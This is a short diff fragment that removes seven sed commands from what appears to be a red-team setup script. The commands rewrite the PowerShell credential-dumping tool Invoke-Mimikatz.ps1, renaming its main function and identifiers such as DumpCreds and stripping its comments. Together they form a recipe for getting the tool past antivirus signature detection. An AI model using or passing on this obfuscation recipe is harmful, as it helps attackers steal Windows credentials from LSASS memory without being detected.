@@ -1,7 +1,0 @@
-sudo sed -i -e 's/Invoke-Minikatz/Invoke-LSASSscraper/g' Invoke-Mimikatz.ps1
-sudo sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
-sudo sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
-sudo sed -i -e 's/DumpCreds/Dump/g' Invoke-Mimikatz.ps1
-sudo sed -i -e 's/ArgumentPtr/Obf/g' Invoke-Mimikatz.ps1
-sudo sed -i -e 's/CallDllMainSC1/ObfSC1/g' Invoke-Mimikatz.ps1
-sudo sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
